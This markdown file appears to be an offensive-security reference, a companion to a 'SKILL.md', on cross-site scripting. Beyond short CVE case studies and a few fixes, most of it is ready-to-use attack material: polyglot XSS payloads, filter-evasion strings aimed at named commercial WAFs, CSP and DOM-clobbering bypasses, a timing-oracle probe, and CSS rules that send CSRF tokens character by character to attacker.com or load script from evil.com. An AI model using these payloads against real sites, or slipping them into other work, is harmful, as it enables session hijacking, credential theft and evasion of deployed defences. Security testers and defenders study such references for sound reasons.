# XSS — Extended Scenarios & Real-World Cases

> Companion to [SKILL.md](./SKILL.md). Contains additional attack scenarios, CVE case studies, and defense bypass techniques.

---

## 1. CVE Case: Django Debug Page XSS (CVE-2017-12794)

Django's debug error page displays unescaped exception messages. When a `UNIQUE` constraint violation occurs, the duplicate value is shown raw:

**Attack flow**:
1. Register username: `<script>alert(1)</script>`
2. Attempt to register again with the same username
3. Django raises `IntegrityError` with the duplicate key value
4. Debug page renders: `duplicate key value violates unique constraint... (<script>alert(1)</script>)`
5. Script executes in the debug page context

**Conditions**: `DEBUG=True` in production (common in misconfigured deployments).

---

## 2. UTF-7 XSS (Legacy)

When the page does not specify charset and Internet Explorer auto-detects encoding:

```text
+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

IE interprets `+ADw-` as `<` in UTF-7 encoding. The server must not set `Content-Type: text/html; charset=utf-8` for this to work.

**Modern relevance**: Rare, but still found in legacy intranet applications using IE compatibility mode.

---

## 3. HttpOnly Bypass Strategies

`HttpOnly` prevents `document.cookie` from reading the session cookie, but XSS can still:

| Technique | How It Works |
|---|---|
| **Proxy the browser** | XSS sends authenticated requests on behalf of victim (XMLHttpRequest/fetch with credentials) — no need to steal the cookie |
| **CSRF via XSS** | Read CSRF token from DOM → perform state-changing actions |
| **Keylogger** | Capture credentials as victim types |
| **Session riding** | Browse the application through injected JS, extract data from responses |
| **TRACE method** | Historical: `TRACE` reflects cookies in response body (blocked in modern servers) |

**Key insight**: HttpOnly does NOT prevent XSS exploitation — it only prevents cookie theft specifically. The attacker can do everything the victim can do through proxied requests.

---

## 4. XS-Leaks (Cross-Site Leak) Scenarios

XS-Leaks infer information about cross-origin pages without reading their content, using side channels:

### Timing-Based Search Oracle

```javascript
async function probe(query) {
    const start = performance.now();
    const img = new Image();
    img.src = `https://target.com/search?q=${query}&_=${Date.now()}`;
    await new Promise(r => { img.onload = img.onerror = r; });
    return performance.now() - start;
}

// If search for "admin_secret" takes 200ms vs 50ms for "nonexistent"
// → "admin_secret" has results → information leaked
```

### Amplification Techniques

- Use search queries that return large result sets → measurable timing difference
- Combine with slow backend operations (regex search, DB full-scan)
- Frame counting: `window.length` reveals iframe count on cross-origin page

### Defense

```
Cache-Control: no-store
```

Prevent timing oracle via cached vs uncached response times. Also: do not use predictable resource names (e.g., `/users/alice/avatar.png`).

---

## 5. Session Fixation via XSS

When the application does not regenerate session IDs after login:

**Attack flow**:
1. Attacker obtains a valid (unauthenticated) session ID
2. Attacker forces victim's browser to use this session ID:
   ```
   https://target.com/setcookie.php?PHPSESSID=attacker_known_value
   ```
3. Victim logs in — the pre-set session ID is now authenticated
4. Attacker uses the same session ID → authenticated as victim

**XSS variant**: inject `document.cookie = "PHPSESSID=FIXED_VALUE"` via stored XSS before victim logs in.

**Fix**: `session_regenerate_id(true)` after authentication.

---

## 6. DOM Clobbering

When CSP blocks inline scripts but allows named HTML elements:

```html
<form id="x"><output id="y">payload</output></form>
<!-- Now document.x.y.value === "payload" -->
<!-- If app code does: element.innerHTML = document.x.y.value → XSS -->
```

Useful when the application trusts DOM properties derived from element IDs/names.

---

## 7. XSS POLYGLOT PAYLOADS

```javascript
// 0xsobky universal:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// s0md3v:
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>

// brutelogic:
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26LT;LT;*/prompt()//

// Polyglot for multiple contexts:
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse
over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

---

## 8. WAF BYPASS BY VENDOR

### Cloudflare

```html
<svg onload=prompt``>
<!-- Use onnull, onrandom (unknown event handlers pass through) -->
<img src=x onnull=alert(1)>
<!-- Entity encoding: -->
<a href="j&#97;v&#97;scr&#105;pt:alert(1)">click</a>
<!-- Tab/newline in javascript: scheme -->
<a href="java
script:alert(1)">click</a>
```

### Akamai

```html
</script><base href="javascript:/a]/-alert(1)//">
<dETAILS open oNtoggle=alert(1)>
<!-- Mutation: -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### Incapsula (Imperva)

```html
<!-- jQuery-based bypass: -->
<script>$.globalEval("al"+"ert(1)")</script>
<!-- Data URI in object: -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### WordFence (WordPress)

```html
<!-- Entity encoding javascript: -->
<a href="javas&#99;ript:alert(1)">click</a>
<!-- Unicode escapes: -->
<img src=x onerror="&#x61;lert(1)">
```

### Fortiweb

```html
<!-- Unicode tag bypass: -->
\u003e\u003cscript\u003ealert(1)\u003c/script\u003e
```

---

## 9. CSP BYPASS TECHNIQUES

### Common CSP Bypasses

```
# If 'unsafe-inline' is allowed → standard XSS works

# If script-src includes CDN with JSONP:
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

# If script-src includes 'self' + file upload:
Upload JS file → <script src="/uploads/evil.js"></script>

# If base-uri not restricted:
<base href="https://attacker.com/">
<script src="/js/app.js"></script>  <!-- Fetches from attacker.com -->

# If script-src allows data: scheme:
<script src="data:text/javascript,alert(1)"></script>

# If strict-dynamic is used without nonce:
<script>document.createElement('script').src='//evil.com/x.js'</script>
```

### DOM Clobbering for CSP Bypass

```html
<!-- Clobber variables used by CSP-nonce scripts -->
<a id="config" href="javascript:alert(1)">
<form id="config"><input name="url" value="javascript:alert(1)"></form>

<!-- Multi-level clobbering: x.y.value -->
<a id=x><a id=x name=y href="javascript:alert(1)">
<!-- document.getElementById('x') returns HTMLCollection -->
<!-- x.y.href = "javascript:alert(1)" -->

<!-- DomPurify bypass with cid: protocol -->
<a id=x href="cid:alert(1)">
<!-- Some sanitizers allow cid: scheme -->

<!-- 3-level deep clobbering via iframe -->
<iframe name=x srcdoc="<a id=y><a id=y name=z href='javascript:alert(1)'>">
<!-- Access: x.y.z.href -->
```

---

## 10. CSS INJECTION DATA EXFILTRATION

When you can inject CSS but NOT JavaScript (common with CSP `style-src 'unsafe-inline'`):

### Attribute Selector Brute-Force

```css
/* Extract CSRF token or input values character by character: */
input[name="csrf"][value^="a"] { background: url(https://attacker.com/?token=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/?token=b); }
/* ... for each character ... */
input[name="csrf"][value^="ab"] { background: url(https://attacker.com/?token=ab); }
/* Server receives callback revealing the token prefix that matched */
```

### @font-face + unicode-range Side Channel

```css
/* Detect specific characters in text nodes: */
@font-face { font-family: probe; src: url(https://attacker.com/?char=A); unicode-range: U+0041; }
@font-face { font-family: probe; src: url(https://attacker.com/?char=B); unicode-range: U+0042; }
/* Apply to target element: */
.secret-text { font-family: probe; }
/* Browser only loads font for characters that actually appear in the text */
```

### Ligature Width Side Channel

```css
/* Create custom font where specific character sequences have different widths */
/* Use CSS to detect element width changes → infer text content */
/* More complex but works for text nodes that attribute selectors can't reach */
```

### Sequential Import Chaining

```css
/* @import chain for multi-round extraction: */
@import url(https://attacker.com/round1.css);
/* Server returns CSS with selectors for next character based on round 1 results */
/* Each round narrows down the token value */
```
